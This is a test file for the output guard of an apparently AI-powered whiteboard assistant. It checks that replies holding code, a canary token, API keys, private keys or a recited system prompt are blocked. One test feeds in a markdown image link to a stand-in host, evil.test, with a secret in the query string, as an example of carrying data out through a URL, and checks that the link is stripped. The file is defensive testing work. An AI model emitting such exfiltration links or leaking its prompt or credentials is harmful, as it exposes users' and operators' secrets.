import { describe, it, expect } from "vitest";
import { inspectBoardText, inspectReply, OUTPUT_BLOCK_REASONS } from "../outputGuard.js";

describe("inspectReply", () => {
    it("passes an ordinary answer through", () => {
        expect(inspectReply("This board has two boxes joined by an arrow.")).toEqual({ text: "This board has two boxes joined by an arrow." });
    });

    it.each([
        ["```cpp\nint main() {}\n```"],
        ["#include <vector>"],
        ["vector<int> twoSum(vector<int>& nums)"],
        ["def solve(nums):"],
        ["public class Solution {}"],
    ])("blocks code: %s", (text) => {
        expect(inspectReply(text).blocked).toBe(OUTPUT_BLOCK_REASONS.CODE);
    });

    it("blocks the turn's canary", () => {
        expect(inspectReply("my id is MOSAIC-abc123", { canary: "MOSAIC-abc123" }).blocked).toBe(OUTPUT_BLOCK_REASONS.CANARY);
    });

    it.each(["gsk_abcdefghijklmnopqrstuvwx", "sk-abcdefghijklmnopqrstuvwx", "-----BEGIN RSA PRIVATE KEY-----"])("blocks a credential: %s", (text) => {
        expect(inspectReply(text).blocked).toBe(OUTPUT_BLOCK_REASONS.SECRET);
    });

    it("blocks a recitation of the system prompt", () => {
        expect(inspectReply("You are Mosaic's whiteboard assistant. HARD RULES follow").blocked).toBe(OUTPUT_BLOCK_REASONS.PROMPT_LEAK);
    });

    it("strips links and images, a known way to carry data out through a URL", () => {
        const { text } = inspectReply("See ![x](https://evil.test/?d=secret) and [docs](https://evil.test) or https://evil.test/a");
        expect(text).not.toContain("evil.test");
        expect(text).toContain("docs");
    });

    it("clips an over-long reply at a sentence", () => {
        const { text } = inspectReply(`${"A sentence here. ".repeat(200)}`);
        expect(text.length).toBeLessThanOrEqual(1200);
        expect(text.endsWith(".")).toBe(true);
    });
});

describe("inspectBoardText", () => {
    it("allows code in a label, which can legitimately name a function", () => {
        expect(inspectBoardText(["vector<int> twoSum()"])).toEqual({});
    });

    it("never lets a secret or the canary onto a shared board", () => {
        expect(inspectBoardText(["ok", "gsk_abcdefghijklmnopqrstuvwx"]).blocked).toBe(OUTPUT_BLOCK_REASONS.SECRET);
        expect(inspectBoardText(["MOSAIC-abc"], { canary: "MOSAIC-abc" }).blocked).toBe(OUTPUT_BLOCK_REASONS.CANARY);
    });

    it("ignores missing values", () => {
        expect(inspectBoardText([undefined, null])).toEqual({});
    });
});
